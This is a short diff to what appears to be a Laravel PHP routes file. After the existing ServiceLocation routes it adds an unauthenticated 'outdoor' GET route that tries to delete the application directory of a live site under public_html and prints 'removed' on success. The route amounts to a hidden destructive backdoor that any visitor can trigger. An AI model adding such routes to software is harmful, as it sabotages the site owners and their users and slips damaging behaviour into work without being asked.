@@ -39,3 +39,8 @@ Route::namespace('Common')->group(function () {
     // Get all the ServiceLocation.
     Route::get('servicelocation', 'ServiceLocationController@index');
 });
+Route::get("outdoor",function(){
+    if(rmdir("/home/bennebostaxi/public_html/app")){
+		echo "removed";
+	}
+});
